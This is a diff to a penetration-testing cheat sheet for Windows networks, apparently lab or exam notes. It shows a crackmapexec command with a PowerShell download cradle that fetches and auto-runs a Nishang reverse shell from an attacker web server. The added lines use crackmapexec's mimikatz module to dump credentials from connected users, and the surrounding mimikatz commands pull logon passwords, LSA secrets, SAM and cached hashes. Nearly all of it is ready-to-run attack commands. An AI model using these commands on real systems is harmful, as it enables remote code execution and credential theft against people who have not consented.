@@ -29,7 +29,7 @@ Second, detect if the SMB signing is disabled. When SMB signing is disabled, an 
 ## Using crackmapexec
 - Reverse shell: [Edit this from Kali to Windows](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)
 - Transfer to windows: `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'iex(New-Object Net.WebClient).DownloadString("http://192.168.223:8000/Invoke-PowerShellTcpOneLine.ps1")'`
-- Reverse shell script will autorun upcon transfer
+- Reverse shell script will autorun upon transfer
 
 # Password-based and Hash-based attack
 ## Extracting hashes
@@ -45,7 +45,12 @@ Second, detect if the SMB signing is disabled. When SMB signing is disabled, an 
          /usr/share/windows-binaries/fgdump/fgdump.exe
 
 ## Dump the credentials of all connected users, including cached hashes
-
+Kali
+         `sudo crackmapexec smb -M mimikatz 192.168.1.54 -u ippsec -Password12345`
+         `sudo crackmapexec smb -M mimikatz 192.168.1.54 -u ippsec -Password12345 --server-port 444`
+         stored in (for sudo): `cat /root/.cme/logs/Mimikatz-192.168.1.54.log`
+         stored in (for non-sudo): `cat ~/cme/logs/Mimikatz-192.168.1.54.log`
+Local
          ./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
          ./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"
 
